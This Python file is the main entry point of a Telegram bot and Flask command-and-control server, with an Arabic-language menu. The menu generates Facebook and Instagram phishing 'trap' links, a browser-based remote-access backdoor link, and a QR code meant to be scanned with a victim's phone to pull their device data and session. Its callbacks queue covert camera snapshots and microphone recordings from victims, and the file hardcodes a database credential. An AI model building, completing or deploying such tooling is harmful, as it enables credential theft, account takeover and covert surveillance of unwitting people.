import os
import threading
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import redis
import uuid

# استيراد ملفات الأدوات المستقلة مع معالجة الأخطاء لتجنب توقف الكونتينر
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing! Please set it in Railway variables.")

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

redis_client = None
try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] Redis connection established successfully in main.py.")
except Exception as e:
    print(f"[-] Critical Redis Connection Error in main.py: {e}")

# تهيئة البوت وتطبيق الفلاسك
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)
app = Flask(__name__)

@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200

# تسجيل الـ Blueprints بشكل آمن إذا كانت متاحة
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)

# ربط مسارات السيرفر للملفات المستقلة
init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)

def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    try:
        user_name = message.from_user.first_name or "صديقي"
        text = (
            f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
            "غير مسؤول تماماً عن إساءة الاستخدام."
        )
        bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
    except Exception as err:
        print(f"[-] Error in start_command: {err}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    try:
        if call.data == "gen_fb":
            bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
            link = f"{RAILWAY_URL}/login.php?id={chat_id}"
            bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
            
        elif call.data == "gen_ig":
            bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
            link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
            bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")

        elif call.data == "gen_rat":
            bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
            link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
            bot.send_message(
                chat_id, 
                f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
                parse_mode="Markdown"
            )

        elif call.data == "gen_qr":
            bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
            token = str(uuid.uuid4())[:8]
            if redis_client:
                try:
                    redis_client.setex(f"qr_token:{token}", 300, chat_id)
                except Exception as e:
                    print(f"Redis write error: {e}")
            
            target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
            qr_image = generate_qr_code_bytes(target_link)
            if qr_image and qr_image.getbuffer().nbytes > 0:
                qr_image.name = 'pairing_qr.jpg'
                bot.send_photo(
                    chat_id, 
                    qr_image, 
                    caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
            
        elif call.data.startswith("rat_cam_"):
            target_chat_id = call.data.replace("rat_cam_", "")
            queue_command(target_chat_id, "snapshot")
            bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")

        elif call.data.startswith("rat_mic_"):
            target_chat_id = call.data.replace("rat_mic_", "")
            queue_command(target_chat_id, "audio")
            bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
            
    except Exception as cb_err:
        print(f"[-] Error in callback_handler: {cb_err}")

def run_telegram_bot():
    print("[+] Starting Telegram Bot polling loop...")
    while True:
        try:
            # إزالة أي ويب هوك قديم قد يتسبب في تعطيل الـ Polling
            bot.remove_webhook()
            time.sleep(1)
            bot.infinity_polling(skip_pending=True, interval=0.5, timeout=20)
        except Exception as e:
            print(f"[-] Telegram Polling Error encountered: {e}")
            time.sleep(5)  # الانتظار قليلاً قبل إعادة المحاولة لمنع حظر الـ IP من تليجرام

if __name__ == "__main__":
    # تشغيل بوت التليجرام في خلفية مستقلة مع إعادة المحاولة التلقائية
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    # تشغيل سيرفر Flask الرئيسي
    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
